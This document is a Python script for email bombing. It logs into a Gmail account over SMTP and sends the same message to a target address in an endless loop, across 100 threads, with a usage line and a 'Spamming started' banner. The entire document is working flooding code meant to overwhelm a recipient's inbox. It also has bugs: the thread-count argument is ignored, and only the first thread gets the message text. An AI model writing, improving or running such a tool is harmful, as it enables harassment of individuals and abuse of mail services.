#!/usr/bin/env python3
import sys, smtplib, ssl, threading, time
    
def spam(email, passw, target, message):
    try:
        while True:
            port = 587
            smtp_server = "smtp.gmail.com"
            context = ssl.create_default_context()
            with smtplib.SMTP(smtp_server, port) as server:
                server.ehlo() 
                server.starttls(context=context)
                server.ehlo() 
                server.login(email, passw)
                server.sendmail(email, target, message)
                print("\rEmail sent!", end="\r")
                time.sleep(5)
    except smtplib.SMTPAuthenticationError:
        print("Too much logins, or password is incorrrect.")
        quit()

if __name__ == "__main__":
    try:
        target = sys.argv[1]
        email = sys.argv[3]
        threads = int(sys.argv[4])
    except:
        print("Usage: python {} <TARGET_EMAIL> <MESSAGE_FILE> <YOUR_GMAIL> <THREADS_NUMBER>".format(sys.argv[0]))
        quit()
    try:
        message = open(sys.argv[2], "r")
    except:
        print("{} doesmt exists".format(sys.argv[0]))
        quit()
    passw = input("Your password: ")
    print("Spamming started.")
    for i in range(100):
        t = threading.Thread(target=spam, args=(email, passw, target, message.read()))
        t.start()
